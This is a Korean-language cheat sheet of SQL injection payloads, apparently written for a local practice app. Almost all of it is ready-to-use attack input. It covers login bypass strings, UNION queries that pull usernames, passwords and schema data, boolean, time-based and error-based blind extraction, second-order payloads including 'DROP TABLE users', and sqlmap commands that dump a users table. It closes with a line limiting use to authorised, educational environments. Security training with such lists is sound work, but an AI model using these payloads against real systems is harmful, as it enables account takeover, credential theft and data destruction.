# SQL Injection Payload Cheat Sheet (교육용)

## 1. 인증 우회 (Login Bypass)

```sql
admin' --
admin' -- 
admin' #
admin' OR '1'='1' --
admin' OR 1=1 --
' OR 1=1 --
' OR '1'='1' --
admin' OR 'x'='x' --
" OR "" = "
admin' AND password LIKE 's3%' --
```

## 2. UNION 기반 (컬럼 수 4개 가정)

```sql
%' UNION SELECT 1,2,3,4 --
%' UNION SELECT NULL, NULL, NULL, NULL --
%' UNION SELECT 1, username, password, 4 FROM users --
%' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables --
%' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='users' --
%' UNION SELECT 1, @@version, user(), database() --
```

컬럼 수 알아내기:
```sql
%' ORDER BY 1 --
%' ORDER BY 2 --
%' ORDER BY 3 --
%' ORDER BY 4 --
```

## 3. Boolean Blind (MySQL)

```sql
1 AND 1=1
1 AND 1=2
1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 10
1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 's'
1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),3,1)) > 50
1 AND (SELECT COUNT(*) FROM information_schema.tables) > 5
```

## 4. Time-based Blind

**MySQL**:
```sql
1 AND SLEEP(3)
1 AND IF(1=1, SLEEP(3), 0)
1 AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='s', SLEEP(3), 0)
```

**SQLite** (Python 실습용):
```sql
1 AND (SELECT hex(randomblob(3000000)))
1 AND (SELECT CASE WHEN (username='admin') THEN randomblob(20000000) ELSE 0 END FROM users LIMIT 1)
```

## 5. Error-based (MySQL)

```sql
1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

## 6. Second Order 예시

댓글/게시글 입력란에 저장:
```sql
'); DROP TABLE users; --
', (SELECT password FROM users WHERE username='admin'), '1
```

나중에 이 값이 다른 쿼리에 사용될 때 공격 발동.

## 7. 정보 수집용 페이로드

```sql
' UNION SELECT 1, version(), 3, 4 --
' UNION SELECT 1, user(), 3, 4 --
' UNION SELECT 1, database(), 3, 4 --
' UNION SELECT 1, @@datadir, 3, 4 --
```

## 8. 방어 테스트용 (Secure 앱에서는 동작하면 안 됨)

위의 모든 페이로드를 secure 버전에 입력해보고, 실제로 쿼리가 어떻게 변하는지 관찰하세요.

## 9. sqlmap 예시

```bash
sqlmap -u "http://127.0.0.1:5000/user?id=1" --dbs
sqlmap -u "http://127.0.0.1:5000/login" --data="username=admin&password=test" --dbs
sqlmap -u "http://127.0.0.1:5000/search?q=test" --dump -T users
```

---

**주의**: 이 페이로드는 교육 및 허가된 환경에서만 사용하세요.